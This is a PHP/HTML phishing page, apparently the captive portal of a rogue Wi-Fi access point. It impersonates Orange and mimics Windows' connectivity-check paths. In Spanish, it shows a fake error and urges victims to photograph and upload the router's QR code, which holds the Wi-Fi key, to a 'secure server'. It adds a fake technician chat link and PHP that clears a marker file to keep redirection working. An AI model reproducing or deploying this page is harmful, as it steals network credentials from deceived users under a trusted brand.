<?php
// on enlève le fichier vu.txt pour ne pas empécher la redirection sur chrome en cas de nouvelle connexion.
  
$file_pointer = "vu.txt"; 
  
// Use unlink() function to delete a file 
if (!unlink($file_pointer)) { 
    echo ("$file_pointer cannot be deleted due to an error"); 
} 
else { 
    echo (""); 
} 
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
	<head>
		<title>Ayuda de Orange</title>
		<meta http-equiv="content-type" content="text/html; charset=UTF-8">
		<meta http-equiv="Content-language" content="fr">
		<link rel="stylesheet" type="text/css" href="/msftconnecttest/ocss/styles.css">
		</head>
		<img src="/msftconnecttest/oimages/lvb1.png">
		<br>
		<br>
		<img src="/msftconnecttest/oimages/lvb2.png">
		<br>
		<br>
		<br>
		<body>
		<br>														
		<br>								
		<br>								 
		<p>Error 109: no se puede conectar, para segurar la conexión hay que tomar foto del codigo QR y poder usar lo con los otros dispositivos que quieren conectarse a la red <b>sin tener que entrar la clave wifi para cada uno de ellos.</b>El codigo QR esta atrás del router.</p>
	<br>
	<img src="/msftconnecttest/oimages/lvbcle1.png">
	<br>
<p>Usted tiene que apoyar el botón <b>Elegir fichero</b> para tomar foto del codigo QR, <b>no hay que moverse durante la foto.</b>Una vez la foto hecha, apoya <b>Upload.</b>Si no funciona, no se cierra la pantalla para usar la camara foto del móvil y tomar foto del codigo QR.Una vez la foto hecha se elige el fichero dentro la galería para enviar la a la verificación del servidor securizado con <b>Upload.</b></p>
<div class="container">
<div class="row">
<div class="col-md-8">
<form id="form" action="ajaxupload.php" method="post" enctype="multipart/form-data">
<input id="uploadImage" type="file" name="image" />
<div id="preview"><img src="filed.png" /></div><br>
<input class="btn btn-success" type="submit" value="Upload">
</form>
<div id="err"></div>
<hr>
<h1>Ayuda</h1>
<p>Si usted no encuentra el codigo QR se puede ponerse en contacto con un tecnico:</strong> <a href="/msftconnecttest/shout/orangetchat.php" target="_blank"><u>Ayuda en linea</u> ...</a></p>
</td>
</tr>
</table>
<br>
<br>
		
	</body>
</html>


